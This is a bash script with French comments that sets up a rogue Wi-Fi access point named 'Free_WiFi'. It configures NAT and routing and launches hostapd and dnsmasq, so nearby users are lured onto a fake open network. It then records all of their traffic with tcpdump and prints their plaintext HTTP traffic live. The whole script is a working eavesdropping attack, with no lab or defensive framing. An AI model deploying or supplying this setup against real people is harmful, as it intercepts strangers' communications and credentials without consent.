#!/bin/bash
# Script principal RogueAP - lance tout automatiquement

# interfaces
AP_IFACE="wlan0"
NET_IFACE="eth0"
AP_IP="192.168.1.1"
SSID="Free_WiFi"

echo "[*] Demarrage du Rogue AP..."

# tue les processus qui genent
sudo airmon-ng check kill 2>/dev/null
sudo pkill hostapd 2>/dev/null
sudo pkill dnsmasq 2>/dev/null
sleep 1

# configure wlan0
sudo ip link set $AP_IFACE down
sudo ip addr flush dev $AP_IFACE
sudo ip link set $AP_IFACE up
sudo ip addr add $AP_IP/24 dev $AP_IFACE
echo "[+] IP $AP_IP assignee"

# active le routage
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

# configure le NAT
sudo iptables -t nat -F
sudo iptables -F
sudo iptables -t nat -A POSTROUTING -o $NET_IFACE -j MASQUERADE
sudo iptables -A FORWARD -i $AP_IFACE -o $NET_IFACE -j ACCEPT
sudo iptables -A FORWARD -i $NET_IFACE -o $AP_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
echo "[+] NAT active"

# lance hostapd
sudo hostapd hostapd.conf > /tmp/hostapd.log 2>&1 &
HOSTAPD_PID=$!
sleep 2

# verifie si hostapd tourne
if kill -0 $HOSTAPD_PID 2>/dev/null; then
    echo "[+] AP lance : $SSID"
else
    echo "[-] Erreur hostapd"
    cat /tmp/hostapd.log
    exit 1
fi

# lance dnsmasq
sudo dnsmasq -C dnsmasq.conf
echo "[+] DHCP/DNS actif"

# lance tcpdump
sudo tcpdump -i $AP_IFACE -w /tmp/capture.pcap 2>/dev/null &
TCPDUMP_PID=$!
echo "[+] Capture -> /tmp/capture.pcap"

# arret propre avec Ctrl+C
trap "
    sudo kill $HOSTAPD_PID $TCPDUMP_PID 2>/dev/null
    sudo pkill dnsmasq 2>/dev/null
    sudo iptables -t nat -F
    sudo iptables -F
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
    echo '[+] Arrete proprement'
    exit 0
" SIGINT SIGTERM

echo "[+] ROGUE AP ACTIF - SSID: $SSID - Ctrl+C pour arreter"

# affiche le trafic HTTP en direct
sudo tcpdump -i $AP_IFACE -n port 80 -A 2>/dev/null
